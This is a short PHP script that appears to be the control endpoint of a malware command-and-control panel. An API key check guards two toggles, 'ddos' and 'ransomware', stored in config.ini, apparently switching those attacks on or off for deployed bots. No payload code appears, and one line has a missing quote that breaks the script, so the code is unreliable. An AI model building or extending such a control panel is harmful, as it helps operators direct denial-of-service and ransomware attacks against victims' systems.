<?php
require_once 'common.php';
$config = parse_ini_file('config.ini', true);


if(isset($_POST['API']) && $_POST['API'] == $config['main']['api'])
{
     if(isset($_POST['ddos'])){
      if ($config['main]['ddos'] == "off"){
        $config['main']['ddos'] = "on";
      }else{
        $config['main']['ddos'] = "off";
      }
     }
     if(isset($_POST['ransomware'])){
      if ($config['main']['ransomware'] == "off"){
        $config['main']['ransomware'] = "on";
      }else{
        $config['main']['ransomware'] = "off";
      }
     }
}

write_ini_file('config.ini', $config);


?>
